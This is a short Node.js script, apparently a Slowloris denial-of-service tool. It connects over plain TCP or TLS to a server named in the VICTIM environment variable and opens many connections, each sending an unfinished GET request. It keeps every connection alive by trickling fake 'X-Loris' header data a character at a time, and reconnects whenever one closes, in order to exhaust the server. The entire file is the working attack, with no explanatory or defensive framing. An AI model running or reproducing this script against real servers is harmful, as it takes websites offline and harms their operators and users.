'use strict'

const {parse} = require('url')
const net = require('net')
const tls = require('tls')

const url = parse(process.env.VICTIM)

const req = [
  `Host: ${url.host}`,
  'Accept: */*',
  ...Array(1000).fill().map((_, i) => `X-Loris-${i}: ${i}`)
].join('\r\n')

let active = 0

startRequestLoop(process.env.LIMIT, 10)
setInterval(() => console.log(`there are ${active} active connections`), 1000)

function startRequestLoop (n, ms) {
  (function requestLoop () {
    if (--n < 0) return
    request()
    setTimeout(requestLoop, ms)
  })()
}

function request () {
  const secure = url.protocol == 'https:'

  const opts = {
    port: url.port || (secure ? 443 : 80),
    host: url.hostname
  }

  const mod = secure ? tls : net

  const socket = mod.connect(opts, () => {
    active++
    let i = 0

    socket.write('GET / HTTP/1.1\n')

    setInterval(() => {
      if (null == req[i]) return
      socket.write(req[i++])
    }, 2000)
  })

  socket.setTimeout(0)

  socket.on('error', () => {})
  socket.on('end', () => {
    active--
    socket.destroy()
    setTimeout(request, 500)
  })
}